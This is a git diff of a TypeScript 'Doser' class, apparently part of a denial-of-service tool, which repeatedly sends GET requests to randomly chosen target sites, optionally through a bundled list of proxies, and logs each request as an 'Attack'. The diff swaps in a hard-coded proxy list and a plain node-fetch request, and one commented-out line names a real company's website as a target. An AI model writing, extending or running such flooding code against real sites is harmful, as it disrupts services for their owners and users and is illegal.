@@ -1,5 +1,8 @@
 import axios from 'axios-https-proxy-fix'
+import fetch from "node-fetch"
+// import HttpsProxyAgent from "https-proxy-agent";
 import { EventEmitter } from 'events'
+import {proxies1} from "./proxies/proxies1";
 
 interface ProxyData {
   ip: string;
@@ -88,34 +91,43 @@ export class Doser {
 
     const {sites, proxies} = this.loadedTargetsAndProxies;
     const randomSite = sites[Math.floor(Math.random() * sites.length)]; //Get random site
-    const randomProxy = proxies[Math.floor(Math.random() * proxies.length)]; //Get random proxy
+    const randomProxy = proxies1[Math.floor(Math.random() * proxies1.length)]; //Get random proxy
+    // const randomProxy = proxies[Math.floor(Math.random() * proxies.length)]; //Get random proxy
     // console.log('data:: ', randomProxy, randomSite)
 
-    const proxyAddressSplit = randomProxy.ip.split(':')
-    const proxyIP = proxyAddressSplit[0]
-    const proxyPort = parseInt(proxyAddressSplit[1])
-    const proxyAuthSplit = randomProxy.auth.split(':')
-    const proxyUsername = proxyAuthSplit[0]
-    const proxyPassword = proxyAuthSplit[1]
+    const proxyArr = randomProxy.split(':');
+    const proxyIP = proxyArr[0];
+    const proxyPort = parseInt(proxyArr[1]);
+    const proxyUsername = proxyArr[2];
+    const proxyPassword = proxyArr[3];
+    // @ts-ignore
+    // const proxyAgent = new HttpsProxyAgent(`http://${proxyUsername}:${proxyPassword}@${proxyIP}:${proxyPort}`);
 
-    const promise = axios.get(
-      randomSite.page,
-      {
-        timeout: 5000,
-        validateStatus: () => true,
-        proxy: {
-          host: proxyIP,
-          port: proxyPort,
-          auth: {
-            username: proxyUsername,
-            password: proxyPassword
-          }
-        }
-      }
-    );
+    // const response = await fetch('https://surgutneftegas.ru/', { agent: proxyAgent});
+
+
+    // const promise = axios.get(
+    //   randomSite.page,
+    //   {
+    //     timeout: 5000,
+    //     validateStatus: () => true,
+    //     proxy: {
+    //       host: proxyIP,
+    //       port: proxyPort,
+    //       auth: {
+    //         username: proxyUsername,
+    //         password: proxyPassword
+    //       }
+    //     }
+    //   }
+    // );
 
     try{
-      const result = await promise;
+      // const result = await promise;
+      const result = await fetch(randomSite.page);
+      // const result = await fetch(randomSite.page, { agent: proxyAgent});
+      // const body = await result.text(); // TODO Does it matter?
+
       console.log(`Attack: ${randomSite.page} | ${result.status}`);
     } catch(e: any) {
       console.log(`Fail: ${randomSite.page} | ${e.code} `);
